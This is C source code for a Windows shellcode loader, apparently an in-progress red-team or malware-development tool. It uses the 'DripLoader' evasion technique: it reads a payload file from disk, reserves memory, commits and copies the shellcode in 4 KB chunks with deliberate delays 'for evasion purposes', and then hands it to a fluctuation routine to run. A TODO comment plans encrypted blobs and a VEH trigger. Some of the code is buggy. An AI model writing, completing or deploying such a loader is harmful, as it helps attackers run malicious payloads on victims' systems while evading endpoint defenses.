#include <Windows.h>
#include <stdio.h>

#include "common.h"

/* Todo:
Implement DripLoader technique to read shellcode from disk and "Drip" into HeapMemory
    - Read encrypted blob from disk
    - HeapAlloc size of blob
    - Copy shellcode into buffer in small 4KB chunks (add delay using CreateTimerQueueTimer)
    - Set chunks to PAGE_READONLY
    - Trigger VEH
*/

int main() {

    // -------------------- Initializating some variables --------------------
    HANDLE hHandle = (HANDLE)-1;                                        // Current process
    DWORD dwSize = 0;                                                   // Size of the shellcode in bytes
    SIZE_T stReservationGran = 0x10000;                                 // Reservation granularity (64 KB)
    SIZE_T stPageSize = 0x1000;                                         // Page size (4 KB)


    // -------------------- Load the shellcode to determine the size --------------------
    PRINTA("[!] Reading Shellcode From Disk....\n");
    unsigned char* buf = ReadShellcode("PAYLOAD.bin", &dwSize);
    if (!buf) {
        PRINTA("[!] Failed to load shellcode.\n");
        return -1;
    }
    PRINTA("[!] Shellcode is %ld bytes.\n", dwSize);

    //  Calculate how many block/pages we need 
    DWORD dwReservationBlocks = (dwSize / stReservationGran) + 1;       // Number of 64 KB blocks needed
    DWORD dwPagesPerBlock = stReservationGran / stPageSize;             // Number of 4 KB pages per 64 KB block

    // Print out the calculated values:
    PRINTA("\t[!] Reservation Blocks needed: %lu\n", dwReservationBlocks);
    PRINTA("\t[!] Pages per Block: %lu\n", dwPagesPerBlock);

    // -------------------- Find memory big enough to hold the shellcode --------------------
    LPVOID pBaseAddress = GetShellcodeBaseAddress(hHandle, (DWORD)stPageSize, (DWORD)stReservationGran, dwReservationBlocks);
    if (pBaseAddress) {
        PRINTA("[!] Found suitable base address: 0x%p\n", pBaseAddress);
    }
    else {
        PRINTA("[!] No suitable base address found.\n");
    }

    // -------------------- MEM_RESERVE the found memory location --------------------
    DWORD dwSizeRounded = ((dwSize + stReservationGran - 1) / stReservationGran) * stReservationGran;   // Round dwSize up to the nearest multiple of stReservationGran
    PRINTA("\t [!] Calucating Rounded Size... : %u\n", dwSizeRounded);
    PVOID pReserved = VirtualAlloc(pBaseAddress, dwSizeRounded, MEM_RESERVE, PAGE_NOACCESS);
    if (pReserved) {
        PRINTA("[!] MEM_RESERVE %u bytes at: 0x%p\n", dwSizeRounded, pBaseAddress);
    }
    else {
        PRINTA("[-] VirtualAlloc (MEM_RESERVE) failed with error: %lu\n", GetLastError());
        return -1;
    }

    // -------------------- We drip slowly 'drip' the shellcode in 4KB slices --------------------
    PRINTA("\n[!] Press <Enter> To Start Dripping...\n");
    WAIT_FOR_ENTER();

        
    DWORD dwOffset = 0;             // Counter to track how many bytes have been processed
    DWORD dwOldProtect = 0;

    // Print the total number of chunks needed for debugging.
    DWORD dwChunksNeeded = (dwSize + stPageSize - 1) / stPageSize;
    PRINTA("[*] Total chunks needed: %lu\n", dwChunksNeeded);

    while (dwOffset < dwSize)
    {

        // We make dwOffset 4KB
        SIZE_T chunkSize = ((dwOffset + stPageSize) <= dwSize) ? stPageSize : (dwSize - dwOffset);
        PRINTA("[Debug] At offset: %lu, stPageSize: %lu, dwSize: %lu, calculated chunkSize: %lu\n", dwOffset, stPageSize, dwSize, chunkSize);

        // First we calculate the 4KB copy adress and increment this with 4KB in the loop
        PVOID pCopyAddress = (LPBYTE)pReserved + dwOffset;
        PRINTA("[!] Committing memory at address 0x%p\n", pCopyAddress);

        // Change the first 4KB of the pReserved pointer to MEM_COMMIT, PAGE_READWRITE
        if (!VirtualAlloc(pCopyAddress, stPageSize, MEM_COMMIT, PAGE_READWRITE)) {
            PRINTA("VirtualAlloc Failed With: %s", GetLastError());
        }

        // Determine how many bytes to print (up to 4096 bytes)
        DWORD bytesToPrint = (dwSize < 4096) ? dwSize : 4096;
        PRINTA("[Debug] First %lu bytes of shellcode:\n", bytesToPrint);

        // We copy shellcode to pCopyAddress
        memcpy(pCopyAddress, buf + dwOffset, chunkSize); // But it should only be the first 4KB of buf (which contains the shellcode)
   
        // Here to dwOffset should be increased by 4KB
        dwOffset += stPageSize;

        // We sleep for evasion purposes - improve this using CreateTimerQueueTimer
        Sleep(1000);

    }

    PRINTA("[!] Dripping complete.\n");

    // Trigger with Flucation shellcode should be READONLY
    if (!FluctuateShellcode(pBaseAddress, dwSize)) {
        PRINTA("[!] FluctuateShellcode failed.\n");
    }


    PRINTA("\n[!] Press <Enter> To Quit...\n");
    WAIT_FOR_ENTER();

    return 0;
};